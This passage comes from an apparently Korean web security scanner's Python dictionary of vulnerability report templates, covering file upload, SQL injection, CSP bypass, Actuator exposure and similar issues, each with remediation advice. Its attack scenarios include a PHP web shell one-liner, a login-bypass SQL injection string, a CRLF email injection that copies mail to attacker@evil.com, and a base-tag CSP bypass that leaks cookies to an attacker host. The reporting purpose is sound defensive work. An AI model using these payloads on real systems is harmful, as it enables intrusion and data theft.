        "cve_references": [],
        "lab_guide": "PortSwigger Insecure Deserialization Labs",
        "recommendation": ("신뢰되지 않은 데이터를 역직렬화하지 마십시오. 불가피하면 무결성 서명(HMAC), "
                           "허용 클래스 화이트리스트, 안전한 포맷(JSON+스키마)으로 전환하십시오."),
    },
    "api_audit": {
        "id": "WEB-API-DEEP",
        "category": "API 인가/데이터 노출",
        "cwe": "CWE-213",
        # 수동검토로 미루지 않는다: 응답에 민감필드가 '실제 노출'된 과다정보노출은 관측=실증(취약).
        # 스펙 구조상 후보인 Mass Assignment/BOLA 만이면 폐기 대신 '공격 표면'으로 분류(아래 분기).
        "kisa_category": "부적절한 접근 통제",
        "business_impact": "API 응답의 민감 필드 과다 노출, 권한 속성 대량 할당, 객체 수준 인가 미흡으로 개인정보 유출·권한 상승 위험",
        "severity": "MEDIUM",
        "cvss_estimate": "6.5",
        "exploitation_difficulty": "Medium",
        "title": "API 보안 점검 — 과다 정보 노출 실증 / Mass Assignment·BOLA 공격 표면",
        "description": (
            "노출된 OpenAPI/Swagger 스펙을 기반으로 API 오퍼레이션을 점검했습니다. "
            "GET 응답에 민감 필드(예: password_hash/role)가 실제 노출된 경우는 과다 정보 노출로 실증 확인되며, "
            "쓰기 오퍼레이션의 권한 속성(Mass Assignment)·객체 식별자 경로(BOLA)는 공격 표면으로 식별됩니다 "
            "(A/B 계정 능동 검증 시 취약으로 승격)."
        ),
        "attack_vector": (
            "GET /api/users/{id} 응답에 password_hash/role 등 노출 · "
            "POST 본문에 role=admin 주입(Mass Assignment) · /api/orders/{id} 객체 참조 교차 접근(BOLA)."
        ),
        "attack_scenario": (
            "1. Swagger 스펙에서 오퍼레이션·파라미터·본문 속성 추출\n"
            "2. GET 응답의 민감 필드 노출 확인\n"
            "3. 권한 속성 수용 여부(Mass Assignment) 및 객체 식별자 인가(BOLA) 검토"
        ),
        "tools": ["burpsuite", "postman", "kiterunner", "arjun"],
        "cve_references": [],
        "lab_guide": "OWASP API Security Top 10 (API1/API3/API6)",
        "recommendation": ("응답 스키마를 최소 필드로 제한(직렬화 화이트리스트), 쓰기 필드 허용목록 적용, "
                           "모든 객체 접근에 서버측 소유·권한 검증(오브젝트 수준 인가)을 강제하십시오."),
    },
    "file_upload": {
        "id": "WEB-FU-ACTIVE",
        "category": "파일 업로드",
        "cwe": "CWE-434",
        "kisa_category": "파일 업로드",
        "business_impact": "웹쉘 업로드를 통한 원격 코드 실행, 서버 완전 장악, 내부망 침투 가능",
        "severity": "HIGH",
        "cvss_estimate": "9.0",
        "exploitation_difficulty": "Medium",
        "title": "위험 파일 업로드 — 서버사이드 실행 가능성 확인",
        "description": (
            "파일 타입 검증 없이 위험한 확장자(.php, .jsp 등) 업로드가 가능합니다. "
            "웹쉘 업로드를 통한 원격 코드 실행(RCE)으로 이어질 수 있습니다."
        ),
        "attack_vector": (
            "Content-Type 위조 또는 확장자 우회(.php.jpg, .php5)로 웹쉘 업로드 → "
            "업로드 경로에서 웹쉘 실행 → OS 명령어 실행."
        ),
        "attack_scenario": (
            "1. .php 파일을 image/jpeg Content-Type으로 업로드\n"
            "2. 업로드 성공 시 파일 URL 획득\n"
            "3. URL 접근 시 PHP 코드 실행 (<?php system($_GET['cmd']); ?>)\n"
            "4. cmd=id로 원격 코드 실행 확인 → 서버 장악"
        ),
        "tools": ["burpsuite", "weevely", "metasploit"],
        "cve_references": [],
        "lab_guide": "DVWA File Upload 모듈, PortSwigger File Upload Vulnerabilities Labs",
        "recommendation": (
            "서버사이드에서 파일 타입을 MIME 분석으로 검증하고, "
            "허용 확장자를 화이트리스트로 제한하세요. "
            "업로드 디렉터리에서 서버사이드 스크립트 실행을 비활성화하세요."
        ),
    },
    "auth_bypass": {
        "id": "WEB-AUTH-BYPASS",
        "category": "인증 우회",
        "cwe": "CWE-290",
        "kisa_category": "인증 취약점",
        "business_impact": "IP 기반 접근 제어 우회, 관리자 기능 무인증 접근, 시스템 설정 변경 및 데이터 탈취 가능",
        "severity": "HIGH",
        "cvss_estimate": "9.8",
        "exploitation_difficulty": "Easy",
        "title": "HTTP 헤더 조작으로 접근 제어 우회 확인",
        "description": (
            "X-Forwarded-For: 127.0.0.1 등의 헤더로 IP 기반 접근 제어가 우회됩니다. "
            "제한된 관리자 페이지나 내부 API에 외부에서 접근 가능합니다."
        ),
        "attack_vector": (
            "X-Forwarded-For: 127.0.0.1 헤더 추가 → 서버가 내부망 요청으로 인식 → "
            "IP 기반 접근 제어 우회."
        ),
        "attack_scenario": (
            "1. curl -H 'X-Forwarded-For: 127.0.0.1' http://target/admin\n"
            "2. 403 → 200으로 변경 (접근 제어 우회)\n"
            "3. 관리자 기능에 무인증 접근\n"
            "4. 시스템 설정 변경, 데이터 탈취"
        ),
        "tools": ["burpsuite", "curl"],
        "cve_references": [],
        "lab_guide": "PortSwigger Access Control Labs",
        "recommendation": (
            "IP 기반 접근 제어를 단독으로 사용하지 마세요. "
            "프록시 헤더(X-Forwarded-For)를 신뢰하지 않도록 설정하고, "
            "세션 기반 인증을 함께 적용하세요."
        ),
    },
    "js_secrets": {
        "id": "WEB-JS-SECRETS",
        "category": "정보 노출",
        "cwe": "CWE-312",
        "kisa_category": "정보 노출",
        "business_impact": "API 키·클라우드 자격증명 탈취로 클라우드 리소스 접근, 서비스 무단 이용 가능",
        "severity": "MEDIUM",
        "cvss_estimate": "5.3",
        "exploitation_difficulty": "Easy",
        "title": "JS/HTML 소스 내 민감정보 노출",
        "description": (
            "JavaScript 파일 또는 HTML 주석에 API 키, 비밀번호, 토큰 등 "
            "민감한 정보가 평문으로 노출되어 있습니다."
        ),
        "attack_vector": (
            "브라우저 개발자 도구 또는 소스 보기로 API 키, AWS 자격증명 등을 직접 획득."
        ),
        "attack_scenario": (
            "1. 페이지 소스 또는 JS 파일에서 API 키 발견\n"
            "2. AWS_ACCESS_KEY_ID, AWS_SECRET_ACCESS_KEY 획득\n"
            "3. AWS CLI로 클라우드 리소스 접근\n"
            "4. S3 버킷 데이터 탈취, EC2 인스턴스 장악"
        ),
        "tools": ["trufflehog", "gitleaks", "burpsuite"],
        "cve_references": [],
        "lab_guide": "TruffleHog, GitLeaks 실습",
        "recommendation": (
            "소스코드에 자격증명을 하드코딩하지 마세요. "
            "환경변수 또는 시크릿 관리 서비스(AWS Secrets Manager, HashiCorp Vault)를 사용하세요."
        ),
    },
    "sqli_auth_bypass": {
        "id": "WEB-GI-AUTH-BYPASS",
        "category": "SQL 인젝션 (인증 우회)",
        "cwe": "CWE-89",
        "kisa_category": "데이터베이스 인젝션",
        "business_impact": "전체 데이터베이스 덤프, 고객 개인정보 유출, 관리자 계정 탈취로 서비스 완전 장악 가능",
        "severity": "HIGH",
        "cvss_estimate": "9.8",
        "exploitation_difficulty": "Easy",
        "title": "SQL 인젝션 인증 우회 — 로그인 폼 패스워드 없이 인증 가능",
        "description": (
            "로그인 폼의 사용자명 또는 패스워드 파라미터에 SQL 페이로드를 삽입하여 "
            "패스워드 없이 로그인이 가능합니다. 서버 응답 변화(302 리다이렉트 또는 성공 키워드)로 실증됩니다."
        ),
        "attack_vector": (
            "username=' OR '1'='1 또는 admin'-- - 형태 삽입 → "
            "WHERE 조건이 항상 참이 되어 첫 번째 계정(종종 관리자)으로 로그인."
        ),
        "attack_scenario": (
            "1. 로그인 폼에 username=' OR '1'='1, password=임의값 입력\n"
            "2. SQL 쿼리: SELECT * FROM users WHERE username='' OR '1'='1'\n"
            "3. 조건이 참 → 첫 번째 사용자(보통 admin) 로그인 성공\n"
            "4. 관리자 권한 획득 → 서비스 완전 장악"
        ),
        "tools": ["sqlmap", "burpsuite", "hydra"],
        "cve_references": [],
        "lab_guide": "DVWA SQL Injection (Login) 모듈, webhacking.kr 인증 우회 챌린지",
        "recommendation": (
            "로그인 쿼리에 PreparedStatement(파라미터화 쿼리)를 사용하세요. "
            "ORM 또는 스토어드 프로시저를 활용하고, 입력값의 특수문자를 필터링하세요."
        ),
    },
    "vim_swp": {
        "id": "WEB-PT-VIM-SWP",
        "category": "정보 노출 (파일 노출)",
        "cwe": "CWE-538",
        "kisa_category": "경로 추적 / 파일 노출",
        "business_impact": "서버 소스코드 복구를 통한 DB 자격증명·API 키 탈취, 추가 공격 기반 마련",
        "severity": "MEDIUM",
        "cvss_estimate": "5.3",
        "exploitation_difficulty": "Easy",
        "title": "Vim 스왑 파일(.swp) 노출 — 서버 소스코드 복구 가능",
        "description": (
            "웹 서버에 Vim 편집기 스왑 파일(.swp)이 노출되어 있습니다. "
            "공격자가 'vim -r .파일명.swp'으로 서버 소스코드를 복구할 수 있습니다."
        ),
        "attack_vector": (
            "/.index.php.swp 등 URL로 스왑 파일 직접 다운로드 → "
            "vim -r 명령으로 소스코드 복구 → DB 자격증명, API 키 등 민감정보 탈취."
        ),
        "attack_scenario": (
            "1. wget http://target/.index.php.swp 다운로드\n"
            "2. vim -r .index.php.swp 로 소스코드 복구\n"
            "3. DB 연결 문자열, 관리자 패스워드, API 키 등 탈취\n"
            "4. 탈취 정보로 DB 직접 접속 또는 추가 공격"
        ),
        "tools": ["curl", "wget", "vim"],
        "cve_references": [],
        "lab_guide": "webhacking.kr Vim 스왑 파일 챌린지",
        "recommendation": (
            "웹 서버에서 .swp, .swo, ~로 끝나는 파일에 대한 접근을 차단하세요. "
            ".htaccess 또는 nginx location으로 숨김 파일 접근 차단: "
            "\"location ~ /\\. { deny all; }\""
        ),
    },
    # ── Phase 2 신규 템플릿 ──────────────────────────────────────────────────────
    "clickjacking": {
        "id": "WEB-CJ-ACTIVE",
        "category": "클릭재킹 (Clickjacking)",
        "cwe": "CWE-1021",
        "kisa_category": "클라이언트사이드 취약점",
        "business_impact": "피해자가 의도치 않은 버튼/링크를 클릭하게 유도 — 계정 삭제, 결제, 권한 변경 등 중요 기능 무단 수행",
        "severity": "MEDIUM",
        "cvss_estimate": "6.1",
        "exploitation_difficulty": "Easy",
        "title": "Clickjacking 취약점 — iframe 실제 로드 확인",
        "description": (
            "X-Frame-Options 헤더와 CSP frame-ancestors가 모두 없어 "
            "다른 사이트의 iframe에 이 페이지를 삽입할 수 있습니다. "
            "Playwright 브라우저에서 iframe이 실제로 렌더링됨을 확인했습니다."
        ),
        "attack_vector": (
            "공격자 사이트에 투명 iframe으로 피해 사이트를 삽입 → "
            "피해자가 공격자 UI를 클릭하는 것처럼 보이지만 실제로는 피해 사이트의 버튼 클릭."
        ),
        "attack_scenario": (
            "1. 공격자 사이트에 opacity:0 iframe으로 피해 사이트 삽입\n"
            "2. 피해자에게 '여기 클릭!' 버튼을 보여줌\n"
            "3. 피해자 클릭 시 실제로는 iframe 내 '계좌이체 확인' 버튼 클릭\n"
            "4. 피해자 인증 쿠키로 중요 액션 수행됨"
        ),
        "tools": ["burpsuite", "clickjacking-poc-generator"],
        "cve_references": [],
        "lab_guide": "PortSwigger Clickjacking Labs",
        "recommendation": (
            "모든 응답에 X-Frame-Options: DENY 또는 SAMEORIGIN 헤더를 추가하거나, "
            "Content-Security-Policy: frame-ancestors 'none' 을 설정하세요."
        ),
    },
    "csp_bypass": {
        "id": "WEB-CSP-BYPASS",
        "category": "CSP 우회 (Content-Security-Policy Bypass)",
        "cwe": "CWE-1021",
        "kisa_category": "클라이언트사이드 취약점",
        "business_impact": "CSP 가 설정돼 있어도 XSS 를 막지 못함 — 세션 쿠키 탈취, 계정 탈취, 관리자 권한 액션 위조로 직접 이어짐",
        "severity": "HIGH",
        "cvss_estimate": "8.1",
        "exploitation_difficulty": "Medium",
        "title": "CSP 우회 — base-uri 미설정으로 nonce 스크립트 하이재킹",
        "description": (
            "Content-Security-Policy 가 nonce/'strict-dynamic' 기반이지만 base-uri 지시자가 "
            "없어, HTML 주입점에 <base href=\"//공격자/\"> 를 삽입하면 경로-절대(/static/..) "
            "nonce 스크립트가 공격자 서버에서 로드된다. 스크립트는 페이지의 유효 nonce 를 그대로 "
            "달고 있어 strict-dynamic 이 이를 허용 → 공격자 JavaScript 가 페이지 권한으로 실행된다. "
            "헤드리스 브라우저(로컬 리스너)로 하이재킹된 스크립트의 실제 실행을 실증했다."
        ),
        "attack_vector": (
            "반사/DOM 주입점으로 <base> 태그 삽입 → nonce 스크립트 로드 출처 하이재킹 → "
            "공격자 JS 가 CSP 를 우회해 실행 → document.cookie 등 유출(내비게이션 채널)."
        ),
        "attack_scenario": (
            "1. param 등 raw 반사 지점에 <base href=\"//attacker/\"> 주입\n"
            "2. 페이지 하단 <script src=\"/static/js/..\" nonce=X> 가 attacker 서버에서 로드됨\n"
            "3. nonce 가 유효하므로 strict-dynamic 이 실행 허용\n"
            "4. 공격자 JS 가 location 내비게이션으로 쿠키(flag/세션) 유출"
        ),
        "tools": ["burpsuite", "playwright"],
        "cve_references": [],
        "lab_guide": "Dreamhack DOM-XSS / PortSwigger CSP Labs",
        "recommendation": (
            "CSP 에 base-uri 'none' (또는 'self') 을 추가해 <base> 주입을 차단하세요. "
            "아울러 주입점(반사/DOM innerHTML)을 출력 인코딩으로 근본 제거하고, "
            "object-src 'none' 설정을 권장합니다."
        ),
    },
    "swagger_openapi": {
        "id": "WEB-INFO-SWAGGER",
        "category": "API 문서 무인증 노출",
        "cwe": "CWE-200",
        "kisa_category": "정보 노출",
        "business_impact": "전체 API 스펙, 인증 방식, 엔드포인트 구조 노출 — 공격자 정찰 및 추가 취약점 탐색에 직접 활용",
        "severity": "MEDIUM",
        "cvss_estimate": "5.3",
        "exploitation_difficulty": "Easy",
        "title": "Swagger/OpenAPI 문서 무인증 노출",
        "description": (
            "인증 없이 Swagger UI 또는 OpenAPI 스펙 파일에 접근할 수 있습니다. "
            "전체 API 엔드포인트, 파라미터, 인증 방식이 노출됩니다."
        ),
        "attack_vector": (
            "브라우저에서 /swagger-ui.html, /api-docs, /v3/api-docs 직접 접근 → "
            "모든 API 엔드포인트·파라미터·인증 방식 열람 → 추가 취약점 탐색."
        ),
        "attack_scenario": (
            "1. /swagger-ui.html 접근으로 API 스펙 열람\n"
            "2. 인증 없는 관리자 API, 내부 API 발견\n"
            "3. API 파라미터 구조 파악 후 SQLi/IDOR 시도\n"
            "4. 보안 테스트 없이 배포된 취약 엔드포인트 집중 공격"
        ),
        "tools": ["burpsuite", "curl", "swagger-cli"],
        "cve_references": [],
        "lab_guide": "OWASP API Security Top 10 — API3:2023 Broken Object Property Level Authorization",
        "recommendation": (
            "운영 환경에서 Swagger UI와 API 문서 엔드포인트를 비활성화하거나 "
            "인증된 사용자만 접근하도록 제한하세요."
        ),
    },
    "graphql_introspection": {
        "id": "WEB-GQL-INTROSPECT",
        "category": "GraphQL Introspection 노출",
        "cwe": "CWE-200",
        "kisa_category": "정보 노출",
        "business_impact": "GraphQL 전체 스키마 노출 — 내부 타입·쿼리·뮤테이션 구조 파악으로 IDOR·권한 우회 공격 가능",
        "severity": "MEDIUM",
        "cvss_estimate": "5.3",
        "exploitation_difficulty": "Easy",
        "title": "GraphQL Introspection 활성화 — 전체 스키마 노출",
        "description": (
            "GraphQL Introspection 쿼리가 활성화되어 있어 "
            "인증 없이 전체 타입, 쿼리, 뮤테이션 스키마를 열람할 수 있습니다."
        ),
        "attack_vector": (
            '{"query":"{ __schema { types { name fields { name } } } }"} 전송으로 '
            "전체 API 구조 파악 → 숨겨진 뮤테이션, 관리자 쿼리 발견."
        ),
        "attack_scenario": (
            "1. Introspection으로 전체 스키마 덤프\n"
            "2. 문서화되지 않은 deleteUser, adminQuery 등 발견\n"
            "3. 권한 검증 없는 내부 뮤테이션으로 데이터 변조\n"
            "4. 타입 구조 분석으로 IDOR 공격 대상 파악"
        ),
        "tools": ["graphql-voyager", "burpsuite", "graphiql"],
        "cve_references": [],
        "lab_guide": "OWASP API Security Top 10 — GraphQL 보안 가이드",
        "recommendation": (
            "운영 환경에서 GraphQL Introspection을 비활성화하세요. "
            "(Apollo Server: introspection: false, depth limit 설정)"
        ),
    },
    "spring_actuator": {
        "id": "WEB-SA-ACTIVE",
        "category": "Spring Actuator 무인증 노출",
        "cwe": "CWE-200",
        "kisa_category": "정보 노출",
        "business_impact": "DB 자격증명, API 키, 환경변수, 내부 서비스 URL 등 민감정보 탈취 — 추가 시스템 접근 가능",
        "severity": "HIGH",
        "cvss_estimate": "7.5",
        "exploitation_difficulty": "Easy",
        "title": "Spring Actuator 무인증 노출 — 민감정보 포함",
        "description": (
            "Spring Boot Actuator 관리 엔드포인트가 인증 없이 외부에 노출되어 있습니다. "
            "/actuator/env에 DB 패스워드, API 키 등 민감정보가 포함되어 있습니다."
        ),
        "attack_vector": (
            "/actuator/env 접근 → 환경변수에서 DB_PASSWORD, JWT_SECRET 등 탈취. "
            "/actuator/mappings로 모든 API 경로 파악."
        ),
        "attack_scenario": (
            "1. GET /actuator/env → DB URL, 패스워드, API 키 탈취\n"
            "2. 탈취한 DB 자격증명으로 데이터베이스 직접 접속\n"
            "3. /actuator/mappings로 전체 API 엔드포인트 파악\n"
            "4. /actuator/shutdown (POST)으로 서버 강제 종료 가능"
        ),
        "tools": ["curl", "burpsuite", "spring-actuator-exploit"],
        "cve_references": ["CVE-2022-22965"],
        "lab_guide": "Spring Boot Actuator 보안 가이드",
        "recommendation": (
            "management.endpoints.web.exposure.include를 health만으로 제한하고, "
            "management.endpoint.health.show-details=never로 설정하세요. "
            "Actuator 엔드포인트에 Spring Security 인증을 적용하세요."
        ),
    },
    "source_map": {
        "id": "WEB-SM-ACTIVE",
        "category": "Source Map 노출",
        "cwe": "CWE-538",
        "kisa_category": "정보 노출",
        "business_impact": "전체 프론트엔드 소스코드 역컴파일 가능 — API 엔드포인트, 비즈니스 로직, 하드코딩된 자격증명 노출",
        "severity": "MEDIUM",
        "cvss_estimate": "5.3",
        "exploitation_difficulty": "Easy",
        "title": "JavaScript Source Map 노출 — 소스코드 역컴파일 가능",
        "description": (
            "JavaScript 파일의 Source Map(.js.map)이 외부에서 접근 가능합니다. "
            "webpack, Vite 등 번들러의 원본 소스코드를 그대로 복원할 수 있습니다."
        ),
        "attack_vector": (
            ".js.map 파일 다운로드 → source-map 라이브러리로 원본 TypeScript/JSX 복원 → "
            "하드코딩된 API 키, 내부 로직, 엔드포인트 분석."
        ),
        "attack_scenario": (
            "1. main.js.map 다운로드\n"
            "2. source-map-cli로 원본 소스 복원\n"
            "3. 하드코딩된 API 키, 관리자 라우트 발견\n"
            "4. 내부 비즈니스 로직 분석으로 취약점 탐색"
        ),
        "tools": ["source-map-cli", "chrome-devtools", "reverse-sourcemap"],
        "cve_references": [],
        "lab_guide": "OWASP Source Code Analysis",
        "recommendation": (
            "운영 빌드에서 sourcemap 생성을 비활성화하세요. "
            "(webpack: devtool: false, Vite: build.sourcemap: false) "
            "또는 웹 서버에서 .map 파일 접근을 차단하세요."
        ),
    },
    "backup_file": {
        "id": "WEB-BF-ACTIVE",
        "category": "백업 파일 노출",
        "cwe": "CWE-538",
        "kisa_category": "경로 추적 / 파일 노출",
        "business_impact": "DB 자격증명, 시크릿 키, 비즈니스 로직이 담긴 소스코드 직접 탈취 가능",
        "severity": "HIGH",
        "cvss_estimate": "7.5",
        "exploitation_difficulty": "Easy",
        "title": "백업 파일 노출 — 소스코드·DB 덤프 직접 접근 가능",
        "description": (
            "웹 서버에 .bak, .old, .backup, .sql 등 백업 파일이 노출되어 있습니다. "
            "소스코드, DB 자격증명, SQL 덤프가 직접 다운로드 가능합니다."
        ),
        "attack_vector": (
            "config.php.bak, .env.bak, backup.sql 등 URL 직접 접근 → "
            "소스코드에서 DB 패스워드, API 키 추출."
        ),
        "attack_scenario": (
            "1. config.php.bak 다운로드\n"
            "2. DB_HOST, DB_USER, DB_PASS 추출\n"
            "3. 데이터베이스 직접 접속으로 전체 데이터 탈취\n"
            "4. backup.sql로 개인정보·패스워드 해시 덤프"
        ),
        "tools": ["curl", "wget", "dirb"],
        "cve_references": [],
        "lab_guide": "OWASP Testing Guide — OTG-CONFIG-004",
        "recommendation": (
            "웹 서버에서 .bak, .old, .backup, .sql, .zip, .tar.gz 파일 접근을 차단하세요. "
            "배포 전 백업 파일을 웹 루트에서 반드시 제거하세요."
        ),
    },
    # Phase 6 신규
    "admin_panel": {
        "id": "WEB-IL-ADMIN",
        "category": "관리자 페이지 노출",
        "cwe": "CWE-284",
        "kisa_category": "접근통제",
        "business_impact": "관리자 인터페이스가 인터넷에 노출되어 자격증명 공격, 알려진 CVE 악용 가능",
        "severity": "MEDIUM",
        "cvss_estimate": "5.3",
        "exploitation_difficulty": "Easy",
        "title": "관리자 페이지 인터넷 노출",
        "description": (
            "관리자 페이지가 인터넷에서 직접 접근 가능한 상태입니다. "
            "인증 요구 여부와 관계없이 관리자 인터페이스의 존재 자체가 공격 대상이 됩니다."
        ),
        "attack_vector": (
            "공격자가 /admin, /dashboard 등에 직접 접근 → 로그인 폼 발견 → "
            "자격증명 스터핑, 브루트포스, 알려진 CMS/관리도구 CVE 적용."
        ),
        "attack_scenario": (
            "1. /admin 경로 탐색 및 로그인 페이지 발견\n"
            "2. 이전에 유출된 자격증명으로 로그인 시도 (크리덴셜 스터핑)\n"
            "3. 로그인 성공 시 사용자 관리·설정 변경·데이터 열람\n"
            "4. 관리자 권한으로 백도어 삽입 또는 데이터 탈취"
        ),
        "tools": ["burpsuite", "gobuster", "hydra"],
        "cve_references": [],
        "lab_guide": "내부망 또는 VPN으로 관리자 접근 제한 권고",
        "recommendation": (
            "관리자 페이지 접근을 내부망/VPN/IP 화이트리스트로 제한하세요. "
            "반드시 MFA(다단계 인증)를 적용하세요."
        ),
    },
    "admin_api": {
        "id": "WEB-IL-ADMIN-API",
        "category": "관리자 API 노출",
        "cwe": "CWE-285",
        "kisa_category": "접근통제",
        "business_impact": "사용자 목록, 설정 정보, 권한 정보 등 민감 데이터 무인증 열람 가능",
        "severity": "HIGH",
        "cvss_estimate": "7.5",
        "exploitation_difficulty": "Easy",
        "title": "관리자/내부 API 무인증 노출 — 민감 데이터 열람 가능",
        "description": (
            "인증 없이 접근 가능한 관리자 또는 내부 API 엔드포인트가 발견되었습니다. "
            "사용자 목록, 시스템 설정, 권한 정보 등 민감 데이터가 JSON으로 반환됩니다."
        ),
        "attack_vector": (
            "GET /api/users (인증 없음) → 전체 사용자 목록 반환 → "
            "이메일·아이디 수집 후 크리덴셜 스터핑 수행."
        ),
        "attack_scenario": (
            "1. /api/admin, /api/users 등 내부 API 경로 탐색\n"
            "2. 인증 헤더 없이 GET 요청 전송\n"
            "3. 사용자 목록·권한·설정·시스템 정보 열람\n"
            "4. 탈취한 정보로 계정 탈취 또는 권한 상승"
        ),
        "tools": ["burpsuite", "curl"],
        "cve_references": [],
        "lab_guide": "OWASP BOLA (IDOR) 실습",
        "recommendation": (
            "모든 API 엔드포인트에 JWT 등 인증을 적용하세요. "
            "/api/admin, /api/internal 경로는 IP 화이트리스트 또는 내부망으로 제한하세요."
        ),
    },
    "framework_info": {
        "id": "WEB-IL-FRAMEWORK",
        "category": "프레임워크 정보 노출",
        "cwe": "CWE-200",
        "kisa_category": "정보 노출",
        "business_impact": "기술 스택 노출로 타깃 공격 가능, Source Map 노출 시 소스코드 복구 가능",
        "severity": "LOW",
        "cvss_estimate": "3.1",
        "exploitation_difficulty": "Easy",
        "title": "SPA 프레임워크/빌드 도구 정보 노출",
        "description": (
            "웹 페이지에서 프레임워크(Next.js, Vue.js 등) 및 빌드 도구 정보가 노출됩니다. "
            "__NEXT_DATA__, sourceMappingURL 등을 통해 기술 스택이 식별됩니다."
        ),
        "attack_vector": (
            "응답 HTML에서 프레임워크 버전 식별 → 알려진 CVE 검색 → "
            "타깃 공격 또는 Source Map을 통한 원본 소스코드 복구."
        ),
        "attack_scenario": (
            "1. 응답에서 __NEXT_DATA__, webpack 런타임 탐지\n"
            "2. 프레임워크 버전 식별 및 CVE 검색\n"
            "3. 해당 버전 취약점 익스플로잇\n"
            "4. 또는 sourceMappingURL로 원본 소스코드 다운로드·분석"
        ),
        "tools": ["wappalyzer", "burpsuite", "retire.js"],
        "cve_references": [],
        "lab_guide": "Retire.js 또는 npm audit으로 취약 패키지 탐지",
        "recommendation": (
            "프로덕션 빌드에서 source map 파일을 제거하거나 내부망으로 제한하세요. "
            "__NEXT_DATA__에 민감한 서버 사이드 데이터를 포함하지 마세요."
        ),
    },
    "user_enumeration": {
        "id": "WEB-AU-ENUM",
        "category": "User Enumeration",
        "cwe": "CWE-204",
        "kisa_category": "인증",
        "business_impact": "계정 존재 여부 확인 후 크리덴셜 스터핑, 표적 공격에 활용 가능",
        "severity": "LOW",
        "cvss_estimate": "5.3",
        "exploitation_difficulty": "Easy",
        "title": "User Enumeration — 로그인 오류 메시지로 계정 존재 여부 판별 가능",
        "description": (
            "로그인 폼에서 존재하지 않는 계정과 비밀번호 오류에 대해 "
            "서로 다른 응답을 반환하여 계정 존재 여부를 판별할 수 있습니다."
        ),
        "attack_vector": (
            "오류 메시지/상태코드/응답 길이 차이를 이용한 계정 존재 여부 확인 → "
            "유효 계정 목록 수집 → 크리덴셜 스터핑."
        ),
        "attack_scenario": (
            "1. 로그인 폼에서 존재하지 않는 계정으로 시도\n"
            "2. 응답 메시지 차이 확인 ('계정 없음' vs '비밀번호 오류')\n"
            "3. 유효 계정 목록 수집\n"
            "4. 크리덴셜 스터핑으로 계정 탈취"
        ),
        "tools": ["burpsuite intruder", "hydra"],
        "cve_references": [],
        "lab_guide": "PortSwigger Username Enumeration Labs",
        "recommendation": (
            "로그인 실패 시 계정 존재 여부를 알 수 없는 통일된 오류 메시지를 사용하세요. "
            "예: '이메일 또는 비밀번호를 확인하세요'"
        ),
    },
    "email_header_injection": {
        "id": "WEB-EMAIL-INJECT",
        "category": "이메일 헤더 인젝션",
        "severity": "MEDIUM",
        "cvss_estimate": "5.4",
        "exploitation_difficulty": "Medium",
        "title": "이메일 헤더 인젝션 — 스팸 발송 및 헤더 위조 가능",
        "description": (
            "이메일 관련 파라미터(to, from, subject 등)에 CRLF 문자를 삽입하여 "
            "임의의 이메일 헤더를 추가할 수 있습니다. 스팸 발송 릴레이, BCC 추가, "
            "헤더 위조 등에 악용될 수 있습니다."
        ),
        "attack_vector": (
            "email=victim@site.com%0d%0aBcc:attacker@evil.com 삽입 → "
            "서버가 BCC 헤더를 포함한 이메일 발송 → 공격자가 이메일 사본 수신."
        ),
        "attack_scenario": (
            "1. 이메일 파라미터에 \\r\\nBcc:attacker@evil.com 삽입\n"
            "2. 서버가 임의 헤더 포함 이메일 발송\n"
            "3. 공격자가 해당 사이트를 스팸 발송 릴레이로 악용\n"
            "4. 피해 사이트 이메일 서버 블랙리스트 등록, 신뢰도 하락"
        ),
        "tools": ["burpsuite", "curl"],
        "cve_references": [],
        "lab_guide": "PortSwigger Email Header Injection Labs",
        "recommendation": (
            "이메일 파라미터에서 CR(\\r), LF(\\n) 문자를 반드시 필터링하세요. "
            "메일 라이브러리의 공식 API를 사용하고 직접 헤더 문자열을 조합하지 마세요."
        ),
    },
    # ── 고도화A: 비즈니스로직/클라이언트측 검증 미강제 ──────────────────────────────
    "clientside_guard_bypass": {
        "id": "WEB-CSV-602",
        "category": "클라이언트측 검증의 서버측 미강제",
        "cwe": "CWE-602",
        "kisa_category": "부적절한 접근 제어 / 입력 검증",
        "business_impact": ("동의 절차·개수/금액 제한 등 업무 규칙을 클라이언트에서만 강제할 경우 "
                            "공격자가 이를 우회해 정책 위반(무단 대량처리, 동의 없는 처리 등)을 유발할 수 있음"),
        "severity": "MEDIUM",
        "cvss_estimate": "6.5",
        "exploitation_difficulty": "Easy",
        "title": "클라이언트 전용 검증의 서버측 미강제 (CWE-602)",
        "description": ("동의 체크·개수 제한 등 클라이언트/JS 에만 존재하는 검증을 서버가 재검증하지 "
                        "않아, 요청을 직접 조작하면 검증을 우회할 수 있습니다."),
        "attack_vector": ("브라우저 UI/JS 게이트를 우회해 필수/동의 필드를 제거하거나 개수 상한을 넘긴 "
                          "요청을 서버에 직접 전송."),
        "attack_scenario": ("1. 클라이언트 JS 에서 검증 규칙(동의 필수·개수 상한) 확인\n"
                            "2. 규칙을 위반한 요청을 서버에 직접 전송\n"
                            "3. 서버가 재검증 없이 수락 → 정책 우회"),
        "tools": ["burpsuite", "curl"],
        "cve_references": [],
        "lab_guide": "OWASP Business Logic Testing (WSTG-BUSL)",
        "recommendation": ("모든 업무 규칙(동의·개수·금액·권한)을 서버측에서 재검증하세요. "
                           "클라이언트 검증은 UX 용도로만 취급합니다."),
    },
    "js_auth_token": {
        "id": "WEB-JSAUTH-287",
        "category": "노출된 토큰을 통한 인증 우회",
        "cwe": "CWE-522",
        "kisa_category": "인증 / 자격증명 관리",
        "business_impact": "클라이언트 JS 에 노출된 자동로그인/세션 토큰으로 타 사용자 인증 상태 획득 가능",
        "severity": "HIGH",
        "cvss_estimate": "8.1",
        "exploitation_difficulty": "Easy",
        "title": "클라이언트 JS 노출 토큰을 통한 인증 우회",
        "description": ("클라이언트 JavaScript 에 자동로그인/세션 토큰이 노출되고, 이를 인증 엔드포인트에 "
                        "재사용하면 인증 상태(쿠키 발급·인증 리다이렉트)를 획득할 수 있습니다."),
        "attack_vector": "공개 JS 파일에서 토큰을 추출해 자동로그인/세션 엔드포인트에 재전송.",
        "attack_scenario": ("1. 공개 JS 에서 auto_login/access_token 추출\n"
                            "2. 해당 토큰을 인증 엔드포인트에 전송\n"
                            "3. 세션 쿠키 발급/인증 페이지 접근 → 인증 우회"),
        "tools": ["curl", "burpsuite"],
        "cve_references": [],
        "lab_guide": "OWASP Authentication Testing (WSTG-ATHN)",
        "recommendation": ("인증 토큰을 클라이언트에 노출하지 마세요. 토큰은 서버측 세션과 결합하고 "
                           "짧은 만료·1회성·바인딩(IP/UA)을 적용하세요."),
    },
    "jsonp_misuse": {
